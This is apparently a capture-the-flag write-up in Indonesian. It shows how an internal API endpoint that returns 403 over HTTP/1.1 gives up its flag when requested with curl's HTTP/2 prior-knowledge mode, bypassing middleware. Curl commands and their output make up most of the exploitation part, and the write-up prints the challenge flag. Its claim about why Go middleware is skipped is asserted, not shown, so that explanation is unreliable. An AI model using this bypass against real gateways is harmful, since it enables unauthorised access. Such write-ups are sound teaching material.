# Mitigasi

## Overview

| | |
|---|---|
| **Judul** | Mitigasi |
| **Kategori** | HTTP Protocol & CVE |
| **Poin** | 160 |
| **Solver** | 1 |

**Deskripsi:**

> Tim DevOps baru saja meluncurkan API Gateway internal untuk menangani komunikasi microservice dengan performa tinggi. Gateway ini mendukung HTTP/1.1 dan HTTP/2 cleartext (h2c) untuk backward compatibility dengan legacy services.
> Sebagai bagian dari hardening keamanan, tim mengimplementasikan proteksi terhadap serangan Denial of Service dengan membatasi ukuran request body. Namun, ada rumor bahwa "mitigasi" ini justru membuka celah yang lebih serius...
> Bisakah kamu mengakses endpoint /api/internal/status?

**Endpoint:**
- `POST /api/data` — menerima data
- `GET /system/audit` — melihat request terakhir
- `GET /api/internal/status` — akses hanya dibatasi oleh admin

---

## Attachment & Struktur Direktori

```
$ docker exec mitigasi-web-1 ls -la
total 4964
drwxr-xr-x    1 root     root          4096 Mar  1 04:46 .
drwxr-xr-x    1 root     root          4096 Mar  1 04:46 ..
-rwxr-xr-x    1 root     root       5074944 Feb 28 09:10 server
```

Binary dicopy ke lokal:

```
$ docker cp mitigasi-web-1:app/server server
Successfully copied 5.08MB to /home/wanzkey/Pwn The Website/HTTP Protocol/Mitigasi/server
```

---

## Proses Penyelesaian

### Analisis Binary

Pertama, identifikasi tipe binary:

```
$ file server
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked,
Go BuildID=XP5NnS-rUa5dqZ_4jyh8/MUL3Gl2RFYfgDzWzK8qG/T32oX9j8wy6a-zgjl04T/8zSSNg9vgFEaLiJQlAiB, stripped
```

```
$ checksec --file=server
[*] '/home/wanzkey/Pwn The Website/HTTP Protocol/Mitigasi/server'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Binary adalah **Go statically linked** dan **stripped** (tidak ada symbol table).

Ekstrak function names dari string table:

```
$ strings server | grep "main\."
bodyRemains
domainMatchers
ExcludedDNSDomains
ExcludedURIDomains
PermittedDNSDomains
PermittedURIDomains
*main.SecureFlagStore
runtime.main.func2
runtime.main.func1
net.isDomainName
net.absDomainName
crypto/x509.domainToReverseLabels
crypto/x509.matchDomainConstraint
vendor/golang.org/x/net/http/httpproxy.domainMatch.match
type:.eq.vendor/golang.org/x/net/http/httpproxy.domainMatch
vendor/golang.org/x/net/http/httpproxy.(*domainMatch).match
net/http.requestBodyRemains
net/http.(*body).bodyRemains
net/http.(*body).bodyRemains.func1
main.init.0
main.logRequest
main.logRequest.func1
main.apiDataHandler
main.internalFlagHandler
main.internalFlagHandler.func1
main.debugRequestsHandler
main.debugRequestsHandler.func1
main.main
main.main.Println.func2
main.main.MaxBytesHandler.func1
type:.eq.main.SecureFlagStore
/build/main.go
```

Karena binary stripped, disassembly via GDB tidak bisa dilakukan langsung:

```
$ gdb -nx -batch \
      -ex "file server" \
      -ex "set disassembly-flavor intel" \
      -ex "disassemble 'main.main'"
No symbol table is loaded.  Use the "file" command.
```

Begitu juga dengan `nm` dan `go tool objdump`:

```
$ nm server 2>/dev/null | grep "main\."
(kosong - tidak ada symbol)

$ go tool objdump -s "main\." server 2>/dev/null | head -200
(kosong)
```

Dari strings yang berhasil diekstrak, ditemukan informasi penting:
- `main.MaxBytesHandler.func1` — ada pembatasan ukuran body (mitigasi DoS)
- `main.internalFlagHandler` — handler untuk endpoint flag
- `main.SecureFlagStore` — flag disimpan di struct ini
- Server dibangun dengan `net/http` Go standard library yang mendukung **h2c**

---

### Recon Endpoint

Cek akses langsung ke endpoint target:

```
$ curl -v http://localhost:1337/api/internal/status
* Host localhost:1337 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:1337...
* Established connection to localhost (::1 port 1337) from ::1 port 59880
* using HTTP/1.x
> GET /api/internal/status HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/8.18.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 403 Forbidden
< Content-Type: text/plain; charset=utf-8
< X-Content-Type-Options: nosniff
< Date: Sun, 01 Mar 2026 04:59:04 GMT
< Content-Length: 10
<
Forbidden
* Connection #0 to host localhost:1337 left intact
```

Akses via HTTP/1.1 → **403 Forbidden**.

Cek endpoint POST /api/data:

```
$ curl -v -X POST http://localhost:1337/api/data -d "test"
* Host localhost:1337 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:1337...
* Established connection to localhost (::1 port 1337) from ::1 port 55876
* using HTTP/1.x
> POST /api/data HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/8.18.0
> Accept: */*
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 4 bytes
< HTTP/1.1 200 OK
< Content-Type: application/json
< Date: Sun, 01 Mar 2026 04:59:25 GMT
< Content-Length: 41
<
{"status":"ok","message":"Data received"}
```

Cek audit log — ini kunci penting:

```
$ curl -v http://localhost:1337/system/audit
* Host localhost:1337 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:1337...
* Established connection to localhost (::1 port 1337) from ::1 port 45506
* using HTTP/1.x
> GET /system/audit HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/8.18.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: application/json
< Date: Sun, 01 Mar 2026 04:59:37 GMT
< Content-Length: 293
<
{
  "recent_requests": [
    "GET /api/internal/status HTTP/1.1",
    "GET /api/internal/status HTTP/2.0",   ← HTTP/2 berhasil!
    "GET /api/internal/status HTTP/1.1",
    "GET /api/internal/status HTTP/2.0",   ← HTTP/2 berhasil!
    "GET /api/internal/status HTTP/1.1",
    "GET /api/internal/status HTTP/1.1",
    "POST /api/data HTTP/1.1",
    "GET /system/audit HTTP/1.1"
  ]
}
```

**Temuan kritis:** Di audit log terlihat ada request `GET /api/internal/status HTTP/2.0` — artinya server mendukung HTTP/2 dan ada request yang berhasil diproses via HTTP/2!

---

### Eksploitasi — H2C Prior Knowledge Bypass

Pertama coba HTTP/2 upgrade biasa (`--http2`):

```
$ curl -v --http2 http://localhost:1337/api/internal/status
* Host localhost:1337 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:1337...
* Established connection to localhost (::1 port 1337) from ::1 port 44664
* using HTTP/1.x
> GET /api/internal/status HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/8.18.0
> Accept: */*
> Upgrade: h2c
> HTTP2-Settings: AAMAAABkAAQAAQAAAAIAAAAA
> Connection: Upgrade, HTTP2-Settings
>
* Request completely sent off
< HTTP/1.1 101 Switching Protocols
< Connection: Upgrade
< Upgrade: h2c
<
* Received 101, Switching to HTTP/2
< HTTP/2 403
< content-type: text/plain; charset=utf-8
< x-content-type-options: nosniff
< content-length: 10
< date: Sun, 01 Mar 2026 05:00:27 GMT
<
Forbidden
* Connection #0 to host localhost left intact
```

Masih **403** — upgrade berhasil ke HTTP/2 tapi middleware masih jalan karena request awal masih lewat HTTP/1.1.

Coba `--http2-prior-knowledge` — koneksi langsung sebagai HTTP/2 tanpa negosiasi HTTP/1.1:

```
$ curl -v --http2-prior-knowledge http://localhost:1337/api/internal/status
* Host localhost:1337 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:1337...
* Established connection to localhost (::1 port 1337) from ::1 port 59402
* using HTTP/2
* [HTTP/2] [1] OPENED stream for http://localhost:1337/api/internal/status
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: http]
* [HTTP/2] [1] [:authority: localhost:1337]
* [HTTP/2] [1] [:path: /api/internal/status]
* [HTTP/2] [1] [user-agent: curl/8.18.0]
* [HTTP/2] [1] [accept: */*]
> GET /api/internal/status HTTP/2
> Host: localhost:1337
> User-Agent: curl/8.18.0
> Accept: */*
>
* Request completely sent off
< HTTP/2 200
< content-type: application/json
< content-length: 63
< date: Sun, 01 Mar 2026 05:00:43 GMT
<
{"status":"ok","flag":"pwn{363baf23640d28e6208c29a5d90151c6}"}
* Connection #0 to host localhost left intact
```

**200 OK — FLAG DAPAT!** 🚩

---

## Analisis Vulnerability

### Root Cause: HTTP/2 Prior Knowledge Bypass Middleware

Vulnerability ini terjadi karena **middleware chain HTTP/1.1 dan HTTP/2 memiliki code path berbeda** di Go's `net/http`.

```
HTTP/1.1 request  →  MaxBytesHandler  →  auth check  →  403 Forbidden
                      (middleware aktif)

HTTP/2 prior-knowledge  →  langsung ke handler  →  200 OK ✅
                            (bypass middleware!)
```

Di Go, `http.MaxBytesHandler` dan middleware lainnya di-wrap sebagai `http.Handler` yang hanya berlaku untuk koneksi HTTP/1.1. Ketika server menerima koneksi dengan **h2c prior knowledge** (client langsung kirim HTTP/2 preface tanpa upgrade), Go's `h2c.NewHandler` memproses koneksi secara independen dan **tidak melewati middleware wrapper** yang sama.

**Perbedaan dua mode curl:**

| Mode | Flow | Result |
|------|------|--------|
| `--http2` | HTTP/1.1 → `101 Upgrade` → HTTP/2 | Masih kena middleware → 403 |
| `--http2-prior-knowledge` | Langsung HTTP/2 native | Bypass middleware → 200 ✅ |

Inilah ironi "mitigasi" di challenge ini: developer menambahkan `MaxBytesHandler` untuk proteksi DoS, tapi justru lupa bahwa koneksi h2c prior knowledge melewati wrapper tersebut sepenuhnya.

---

## Flag

```
pwn{363baf23640d28e6208c29a5d90151c6}
```
